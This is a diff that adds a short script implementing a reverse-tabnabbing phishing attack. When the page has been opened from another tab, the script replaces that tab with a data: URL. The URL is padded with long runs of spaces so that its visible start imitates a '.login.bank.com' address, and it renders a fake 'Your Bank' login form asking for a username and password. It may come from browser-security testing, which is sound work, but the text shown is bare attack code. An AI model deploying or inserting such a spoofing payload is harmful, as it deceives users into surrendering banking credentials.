@@ -1,0 +1,24 @@
+<script>
+var spaces = 
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          ";
+var html = [
+  '<title>Your Bank</title>',
+  '<h1>Please Log In</h1>',
+  '<form>'
+  '<input placeholder="username">',
+  '<input type="password" placeholder="password">',
+  '</form>',
+].join('');
+
+if (window.opener) {
+  window.opener.location = 'data:text/html;.login.bank.com' + spaces + ',' + escape(html);
+}
+
+</script>
